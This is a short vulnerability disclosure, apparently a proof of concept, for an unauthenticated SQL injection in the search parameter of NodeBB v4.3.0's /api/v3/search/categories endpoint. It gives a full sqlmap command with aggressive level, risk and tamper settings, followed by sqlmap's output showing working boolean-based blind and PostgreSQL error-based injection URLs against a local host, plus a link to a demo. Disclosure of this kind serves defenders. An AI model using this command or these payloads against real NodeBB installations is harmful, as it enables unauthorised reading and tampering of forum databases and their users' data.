NodeBB v4.3.0.

NodeBB v4.3.0 is vulnerable to SQL injection in its search‐categories API endpoint (/api/v3/search/categories). The search query parameter is not properly sanitized, allowing unauthenticated, remote attackers to inject boolean‐based blind and PostgreSQL error‐based payloads.


Command used:

```
python3 ~/tools/sqlmapproject-sqlmap-c8c7fee/sqlmap.py -r nodebb
--level 5 --risk 3 -a --banner --batch --tamper
least,charencode,escapequotes
```

SQL Injection details from sqlmap:
```
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://nodebb.local.yunohost/api/v3/search/categories?search='
AND 4638=4638--
tbby&query[cid]=-1&parentCid=0&selectedCids[]=-1&privilege=topics:read&states[]=watching&states[]=tracking&states[]=notwatching&showLinks=

    Type: error-based
    Title: PostgreSQL OR error-based - WHERE or HAVING clause
    Payload: http://nodebb.local.yunohost/api/v3/search/categories?search=-3217'
OR 1251=CAST((CHR(113)||CHR(98)||CHR(118)||CHR(98)||CHR(113))||(SELECT
(CASE WHEN (1251=1251) THEN 1 ELSE 0
END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(98)||CHR(113)) AS
NUMERIC)-- WsPn&query[cid]=-1&parentCid=0&selectedCids[]=-1&privilege=topics:read&states[]=watching&states[]=tracking&states[]=notwatching&showLinks=
---
```
Demo:

![](https://github.com/4rdr/proofs/blob/main/gifs/NodeBB-v4.3.0.-SQL-Injection-via-search-parameter.gif?raw=true)
